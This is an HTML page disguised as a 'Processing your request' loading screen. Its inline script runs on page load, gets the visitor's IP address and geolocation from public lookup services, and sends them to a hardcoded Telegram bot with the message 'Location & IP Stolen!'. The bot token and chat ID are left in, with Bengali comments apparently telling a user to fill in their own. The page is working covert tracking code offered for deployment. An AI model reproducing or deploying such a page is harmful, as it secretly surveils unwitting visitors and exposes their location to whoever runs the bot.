<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #2c2c2c;
            color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }
        .loading {
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Processing your request...</h2>
        <p class="loading">Please wait while we verify your data.</p>
    </div>

    <script>
        function stealData() {
            // Get IP Address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;

                    // Get Location
                    fetch(`https://ipapi.co/${ipAddress}/json/`)
                        .then(response => response.json())
                        .then(locationData => {
                            const latitude = locationData.latitude;
                            const longitude = locationData.longitude;
                            const city = locationData.city;
                            const country = locationData.country_name;

                            // Send data to Telegram bot (তোমার টোকেন আর চ্যাট আইডি সহ)
                            const botToken = '8813415753:AAE1cUKpHTY2y1-vMzoKep_HmD2Xrnrpqh0'; // তোমার বট টোকেন
                            const chatId = '8596657965'; // তোমার চ্যাট আইডি
                            const message = `🚨 Location & IP Stolen! 🚨\n\nIP Address: ${ipAddress}\nLocation: ${city}, ${country}\nCoordinates: ${latitude}, ${longitude}`;

                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                                .then(() => {
                                    console.log("Data sent to Telegram bot!");
                                })
                                .catch(error => {
                                    console.error("Error sending data:", error);
                                });
                        })
                        .catch(error => {
                            console.error("Error fetching location data:", error);
                        });
                })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                });
        }

        // Run the function immediately
        stealData();
    </script>
</body>
</html>
